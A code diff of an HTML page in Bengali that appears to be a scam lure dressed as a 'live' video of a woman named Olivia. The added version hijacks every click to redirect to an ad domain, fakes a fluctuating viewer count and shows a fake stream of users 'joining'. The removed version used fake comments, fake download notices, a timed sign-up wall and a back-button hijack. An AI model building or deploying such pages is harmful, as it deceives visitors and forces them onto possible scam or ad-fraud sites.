@@ -1,332 +1,581 @@
+
 <!DOCTYPE html>
 <html lang="bn">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Olivia Casta Was Live Now</title>
-  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --primary: #FF5722;
-      --primary-dark: #E64A19;
-      --text: #333;
-      --light-bg: #f5f5f5;
+<head><script>
+
+document.body.addEventListener("click", () => {
+
+    window.location.href =
+    "https://omg10.com/4/11027759";
+
+});
+
+</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Style Live</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Inter',sans-serif;
+}
+
+body{
+    background:#000;
+    color:#fff;
+    overflow-x:hidden;
+}
+
+.live-container{
+    width:100%;
+    max-width:500px;
+    margin:auto;
+    min-height:100vh;
+    position:relative;
+    background:#000;
+}
+
+/* TOP */
+
+.top-bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:14px 16px;
+}
+
+.left-top{
+    display:flex;
+    align-items:center;
+    gap:10px;
+}
+
+/* LIVE BADGE */
+
+.live-badge{
+    background:#ff1744;
+    color:#fff;
+    font-weight:700;
+    font-size:17px;
+    padding:9px 15px;
+    border-radius:6px;
+    letter-spacing:.5px;
+    animation:livePulse 1s infinite;
+    box-shadow:0 0 15px rgba(255,23,68,.5);
+}
+
+@keyframes livePulse{
+
+    0%{
+        opacity:1;
+        transform:scale(1);
     }
-    
-    body {
-      margin: 0;
-      font-family: 'Hind Siliguri', sans-serif;
-      background-color: var(--light-bg);
-      color: var(--text);
-      line-height: 1.6;
+
+    50%{
+        opacity:.7;
+        transform:scale(1.05);
     }
-    
-    .container {
-      max-width: 800px;
-      margin: 20px auto;
-      padding: 20px;
-      background: white;
-      border-radius: 10px;
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+
+    100%{
+        opacity:1;
+        transform:scale(1);
     }
-    
-    h1 {
-      color: var(--primary);
-      text-align: center;
-      margin-bottom: 10px;
+
+}
+
+/* VIEWER */
+
+.viewer{
+    background:#2d2d2d;
+    padding:10px 14px;
+    border-radius:8px;
+    display:flex;
+    align-items:center;
+    gap:8px;
+    font-size:18px;
+    font-weight:600;
+}
+
+.right-top{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+.follow-btn{
+    background:#1f1f1f;
+    border:none;
+    color:#fff;
+    padding:12px 22px;
+    border-radius:12px;
+    font-size:18px;
+    cursor:pointer;
+}
+
+.icon{
+    font-size:25px;
+}
+
+/* PROFILE */
+
+.profile-bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:0 16px 14px;
+}
+
+.profile-left{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+.profile-left img{
+    width:58px;
+    height:58px;
+    border-radius:50%;
+    object-fit:cover;
+}
+
+.profile-name{
+    font-size:22px;
+    font-weight:700;
+}
+
+.close-btn{
+    font-size:55px;
+    cursor:pointer;
+}
+
+/* VIDEO */
+
+.video-section{
+    width:100%;
+    position:relative;
+}
+
+video{
+    width:100%;
+    display:block;
+    background:#000;
+    object-fit:cover;
+}
+
+/* FULLSCREEN */
+
+.expand{
+    position:absolute;
+    bottom:18px;
+    right:18px;
+    background:rgba(0,0,0,.6);
+    width:48px;
+    height:48px;
+    border-radius:12px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-size:22px;
+    cursor:pointer;
+}
+
+/* RANDOM JOIN */
+
+.random-join{
+    position:absolute;
+    left:15px;
+    bottom:120px;
+    background:rgba(0,0,0,.75);
+    backdrop-filter:blur(10px);
+    border-radius:40px;
+    padding:10px 14px;
+    display:flex;
+    align-items:center;
+    gap:10px;
+    opacity:0;
+    transform:translateX(-100px);
+    transition:.4s;
+    z-index:999;
+}
+
+.random-join.show{
+    opacity:1;
+    transform:translateX(0);
+}
+
+.random-join img{
+    width:42px;
+    height:42px;
+    border-radius:50%;
+    object-fit:cover;
+}
+
+.join-text{
+    font-size:15px;
+    font-weight:500;
+}
+
+/* FLOAT LIKE */
+
+.float-like{
+    position:absolute;
+    right:25px;
+    bottom:120px;
+    font-size:32px;
+    animation:floatLike 3s linear forwards;
+    z-index:9999;
+}
+
+@keyframes floatLike{
+
+    0%{
+        transform:translateY(0) scale(.8);
+        opacity:1;
     }
-    
-    .stats {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      margin-bottom: 15px;
-      flex-wrap: wrap;
+
+    100%{
+        transform:translateY(-250px) scale(1.8);
+        opacity:0;
     }
-    
-    .stat {
-      background: #f0f0f0;
-      padding: 5px 15px;
-      border-radius: 20px;
-      font-size: 0.9em;
-    }
-    
-    .video-container {
-      position: relative;
-      margin: 20px 0;
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    
-    iframe {
-      width: 100%;
-      height: 450px;
-      border: none;
-      display: block;
-    }
-    
-    .progress-container {
-      width: 100%;
-      background: #e0e0e0;
-      border-radius: 5px;
-      margin: 15px 0;
-    }
-    
-    .progress-bar {
-      height: 10px;
-      background: var(--primary);
-      width: 0%;
-      border-radius: 5px;
-      transition: width 1s linear;
-    }
-    
-    .premium-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.9);
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      text-align: center;
-      padding: 20px;
-      border-radius: 8px;
-    }
-    
-    .btn {
-      display: inline-block;
-      padding: 10px 25px;
-      background: var(--primary);
-      color: white;
-      border-radius: 5px;
-      text-decoration: none;
-      font-weight: bold;
-      margin: 10px 0;
-      transition: all 0.3s;
-    }
-    
-    .btn:hover {
-      background: var(--primary-dark);
-      transform: translateY(-2px);
-    }
-    
-    .comments {
-      margin-top: 30px;
-      max-height: 150px;
-      overflow-y: hidden;
-      padding: 10px;
-      background: #f9f9f9;
-      border-radius: 8px;
-      position: relative;
-    }
-    
-    .comment-container {
-      animation: scrollComments 30s linear infinite;
-    }
-    
-    @keyframes scrollComments {
-      0% { transform: translateY(0); }
-      100% { transform: translateY(-70%); }
-    }
-    
-    .comment {
-      padding: 12px;
-      margin-bottom: 10px;
-      background: white;
-      border-radius: 6px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-    }
-    
-    .comment strong {
-      color: var(--primary);
-    }
-    
-    .comment .time {
-      font-size: 0.8em;
-      color: #777;
-    }
-    
-    /* Floating CTA Button */
-    .floating-btn {
-      position: fixed;
-      bottom: 30px;
-      left: 30px;
-      z-index: 1000;
-    }
-    
-    .floating-btn a {
-      display: block;
-      background: #FF5722;
-      color: white;
-      padding: 15px 20px;
-      border-radius: 50px;
-      font-weight: bold;
-      text-decoration: none;
-      box-shadow: 0 5px 15px rgba(255,87,34,0.4);
-      animation: pulse 2s infinite;
-    }
-    
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-    
-    /* Download Popup */
-    #downloadPopup {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: white;
-      padding: 15px;
-      border-radius: 8px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-      z-index: 1000;
-      display: none;
-      max-width: 250px;
-    }
-  </style>
+
+}
+
+/* FACEBOOK BUTTONS */
+
+.fb-reactions{
+    position:fixed;
+    bottom:18px;
+    left:50%;
+    transform:translateX(-50%);
+    width:100%;
+    max-width:500px;
+    display:flex;
+    justify-content:space-around;
+    padding:0 12px;
+    z-index:999;
+}
+
+.fb-btn{
+    width:31%;
+    background:#1d1d1d;
+    border-radius:50px;
+    padding:15px 0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:10px;
+    font-size:18px;
+    font-weight:600;
+    transition:.3s;
+    cursor:pointer;
+    user-select:none;
+}
+
+.fb-btn i{
+    font-size:21px;
+}
+
+.like-btn.active{
+    background:#1877f2;
+}
+
+.comment-btn.active{
+    background:#00b894;
+}
+
+.share-btn.active{
+    background:#8e44ad;
+}
+
+</style>
 </head>
+<script>
+
+document.addEventListener("click", function(){
+
+    window.location.href =
+    "https://omg10.com/4/11027759";
+
+});
+
+</script>
 <body>
-  <div class="container">
-    <h1>Olivia Full Video </h1>
-    
-    <div class="stats">
-      <div class="stat">👁️ 330,637K Views</div>
-      <div class="stat">📥 90,537 Downloaded </div>
-      <div class="stat">⭐ 4.9/5 Ratting</div>
-      <div class="stat">👥 <span id="liveViewers">22,460</span> LIVE</div>
-    </div>
-    
-    <div class="video-container">
-      <iframe id="videoPlayer" src="https://mega.nz/embed/L5wjHToQ#2FaXJLoxve9qkHT9Q8xYF2yJXFvU3vCzNOU4wV9SJXc" allowfullscreen></iframe>
-      
-      <div class="progress-container">
-        <div class="progress-bar" id="progressBar"></div>
-      </div>
-      
-      <div class="premium-overlay" id="premiumOverlay">
-        <h2>To Watch Full Video. Sing-Up !</h2>
-        <p>You Watch Free 30s.Please Sing-Up Now</p>
-        <a href="https://omg10.com/4/11027759" class="btn">👉 Sign-up For (Free)</a>
-      </div>
-    </div>
-    
-    <div style="text-align: center;">
-      <a href="https://omg10.com/4/11027759">📥 ভিডিও ডাউনলোড করুন</a>
-    </div>
-    
-    <div class="comments">
-      <div class="comment-container" id="commentsSection">
-        <div class="comment">
-          <strong> Alex:</strong> Beautiful video — and I love how easy the download was!<span class="time">Just Now</span>
-        </div>
-        <div class="comment">
-          <strong>Pedro:</strong>Respect for uploading such quality content with no clickbait 🙌! <span class="time">Just Now</span>
-        </div>
-        <div class="comment">
-          <strong>Riso:</strong> Sign-up And Download 👍 <span class="time">50s ago</span>
-        </div>
-        <div class="comment">
-          <strong>Adrian:</strong> Confirmed: the download link is working 100%! Thanks for sharing<span class="time">1m ago</span>
-        </div>
-        <div class="comment">
-          <strong>Jhon Riffo:</strong> Absolutely stunning 🥰<span class="time">3m ago</span>
-        </div>
-        <div class="comment">
-          <strong>Jerry:</strong> Yes my love lover 💋💋💋💋💋<span class="time">4m ago</span>
-        </div>
-        <div class="comment">
-          <strong>Charles:</strong> My baby is beautiful.<span class="time">5m ago</span>
-        </div>
-      </div>
-    </div>
-  </div>
 
-  <!-- Floating CTA Button -->
-  <div class="floating-btn">
-    <a href="https://omg10.com/4/11027759">
-      🔥 সাইন আপ করুন সম্পূর্ণ ভিডিও দেখতে! 🔥
-    </a>
-  </div>
+<div class="live-container">
 
-  <!-- Recent Downloads Popup -->
-  <div id="downloadPopup">
-    <strong>Recent Downloads:</strong>
-    <div id="downloadList"></div>
-  </div>
+    <!-- TOP -->
+    <div class="top-bar">
 
-  <script>
-    // টাইমার সেটআপ (৩০ সেকেন্ড)
-    const totalTime = 30;
-    let timeLeft = totalTime;
-    const progressBar = document.getElementById('progressBar');
-    const premiumOverlay = document.getElementById('premiumOverlay');
-    
-    // প্রোগ্রেস বার আপডেট
-    const timer = setInterval(() => {
-      timeLeft--;
-      const progress = ((totalTime - timeLeft) / totalTime) * 100;
-      progressBar.style.width = progress + "%";
-      
-      if (timeLeft <= 0) {
-        clearInterval(timer);
-        showSignupPopup();
-      }
-    }, 1000);
-    
-    // Signup Popup and Redirect
-    function showSignupPopup() {
-      premiumOverlay.style.display = "flex";
-      setTimeout(() => {
-        window.location.href = "https://t.co/nhYueZgaGU";
-      }, 5000); // 5 seconds delay before redirect
+        <div class="left-top">
+
+            <!-- LIVE -->
+            <div class="live-badge">
+                LIVE
+            </div>
+
+            <!-- VIEWERS -->
+            <div class="viewer">
+                <i class="fa-solid fa-eye"></i>
+                <span id="viewerCount">8.2K</span>
+            </div>
+
+        </div>
+
+        <div class="right-top">
+
+            <div class="icon">
+                <i class="fa-solid fa-video"></i>
+            </div>
+
+            <button class="follow-btn">
+                Follow
+            </button>
+
+            <div class="icon">
+                <i class="fa-solid fa-ellipsis"></i>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- PROFILE -->
+    <div class="profile-bar">
+
+        <div class="profile-left">
+
+            <img src="https://i.pravatar.cc/150?img=32">
+
+            <div class="profile-name">
+                Olivia.Tv
+            </div>
+
+        </div>
+
+        <div class="close-btn">
+            ×
+        </div>
+
+    </div>
+
+    <!-- VIDEO -->
+    <div class="video-section">
+
+        <video
+            id="liveVideo"
+            autoplay
+            muted
+            playsinline
+            controls
+        >
+            <source src="https://cdn.videy.co/edtIa9lQ1.mp4" type="video/mp4">
+        </video>
+
+        <!-- FULLSCREEN -->
+        <div class="expand">
+            <i class="fa-solid fa-expand"></i>
+        </div>
+
+        <!-- RANDOM JOIN -->
+        <div class="random-join" id="randomJoin">
+
+            <img id="joinAvatar" src="">
+
+            <div class="join-text">
+                <span id="joinName">Rahim</span> joined
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<!-- FACEBOOK REACTIONS -->
+
+<div class="fb-reactions">
+
+    <div class="fb-btn like-btn" id="likeBtn">
+        <i class="fa-solid fa-thumbs-up"></i>
+        <span id="likeCount">47K</span>
+    </div>
+
+    <div class="fb-btn comment-btn" id="commentBtn">
+        <i class="fa-solid fa-comment"></i>
+        <span id="commentCount">3.7K</span>
+    </div>
+
+    <div class="fb-btn share-btn" id="shareBtn">
+        <i class="fa-solid fa-share"></i>
+        <span id="shareCount">10K</span>
+    </div>
+
+</div>
+
+<script>
+
+// VIDEO AUTOPLAY
+
+const video = document.getElementById("liveVideo");
+
+video.play().catch(() => {
+    console.log("Autoplay blocked");
+});
+
+// FULLSCREEN
+
+document.querySelector(".expand").onclick = () => {
+
+    if(video.requestFullscreen){
+        video.requestFullscreen();
     }
-    
-    // Fake live viewer counter
-    setInterval(() => {
-      const viewers = document.getElementById('liveViewers');
-      const current = parseInt(viewers.textContent.replace(/,/g, ''));
-      viewers.textContent = (current + Math.floor(Math.random() * 5)).toLocaleString();
+
+};
+
+// RANDOM VIEWERS
+
+let viewers = 8200;
+
+setInterval(() => {
+
+    const random = 100;
+
+    if(Math.random() > 0.5){
+        viewers += random;
+    }else{
+        viewers -= random;
+    }
+
+    if(viewers < 1000){
+        viewers = 1000;
+    }
+
+    document.getElementById("viewerCount").innerText =
+    (viewers / 1000).toFixed(1) + "K";
+
+}, 2500);
+
+
+// RANDOM 300 JOIN
+
+const names = [
+"Rahim","Karim","Sakib","Nadia","Tamim","Hasan",
+"Akash","Mim","Sadia","Jannat","Rifat","Arif",
+"Adnan","Rupa","Tisha","Nusrat","Fahim","Raisa",
+"Habib","Nayeem","Jui","Tania","Rony","Joy"
+];
+
+const joinBox = document.getElementById("randomJoin");
+
+let joinCount = 0;
+
+function randomJoin(){
+
+    if(joinCount >= 300){
+        return;
+    }
+
+    const randomName =
+    names[Math.floor(Math.random() * names.length)];
+
+    const randomAvatar =
+    "https://i.pravatar.cc/150?img=" +
+    Math.floor(Math.random() * 70);
+
+    document.getElementById("joinName").innerText =
+    randomName;
+
+    document.getElementById("joinAvatar").src =
+    randomAvatar;
+
+    joinBox.classList.add("show");
+
+    setTimeout(() => {
+        joinBox.classList.remove("show");
     }, 3000);
-    
-    // Fake recent downloads popup
-    const names = ['মোহাম্মদ', 'আনিকা', 'রাজু', 'সুমাইয়া', 'ইমন', 'তানহা'];
-    const places = ['ঢাকা', 'চট্টগ্রাম', 'সিলেট', 'খুলনা', 'রাজশাহী', 'বরিশাল'];
-    
-    function showDownload() {
-      const name = names[Math.floor(Math.random() * names.length)];
-      const place = places[Math.floor(Math.random() * places.length)];
-      const time = Math.floor(Math.random() * 5) + 1;
-      
-      document.getElementById('downloadList').innerHTML = 
-        `<div>${name} from ${place} downloaded ${time} minute${time > 1 ? 's' : ''} ago</div>` + 
-        document.getElementById('downloadList').innerHTML;
-      
-      document.getElementById('downloadPopup').style.display = 'block';
-      setTimeout(() => document.getElementById('downloadPopup').style.display = 'none', 5000);
-    }
-    
-    // Show first popup after 15 seconds
-    setTimeout(showDownload, 15000);
-    // Then show every 20-40 seconds
-    setInterval(showDownload, 20000 + Math.random() * 20000);
-    
-    // Double comments for scrolling effect
-    const commentsSection = document.getElementById('commentsSection');
-    commentsSection.innerHTML = commentsSection.innerHTML + commentsSection.innerHTML;
-    
-    // ব্যাক বাটন হ্যান্ডলিং - Redirect to your link when back button is pressed
-    window.addEventListener('load', function() {
-      history.pushState(null, null, location.href);
-      window.onpopstate = function(event) {
-        window.location.href = "https://t.co/nhYueZgaGU";
-      };
-    });
-  </script>
+
+    joinCount++;
+
+}
+
+setInterval(randomJoin, 2200);
+
+
+// LIKE BUTTON
+
+let likes = 47000;
+
+document.getElementById("likeBtn").onclick =
+function(){
+
+    this.classList.toggle("active");
+
+    likes++;
+
+    document.getElementById("likeCount").innerText =
+    (likes / 1000).toFixed(1) + "K";
+
+    const like = document.createElement("div");
+
+    like.className = "float-like";
+
+    like.innerHTML = "👍";
+
+    document.body.appendChild(like);
+
+    like.style.right =
+    Math.random() * 60 + 10 + "px";
+
+    setTimeout(() => {
+        like.remove();
+    }, 3000);
+
+};
+
+
+// COMMENT BUTTON
+
+let comments = 3799;
+
+document.getElementById("commentBtn").onclick =
+function(){
+
+    this.classList.toggle("active");
+
+    comments++;
+
+    document.getElementById("commentCount").innerText =
+    (comments / 1000).toFixed(1) + "K";
+
+};
+
+
+// SHARE BUTTON
+
+let shares = 10000;
+
+document.getElementById("shareBtn").onclick =
+function(){
+
+    this.classList.toggle("active");
+
+    shares++;
+
+    document.getElementById("shareCount").innerText =
+    (shares / 1000).toFixed(1) + "K";
+
+};
+
+</script>
+
 </body>
 </html>
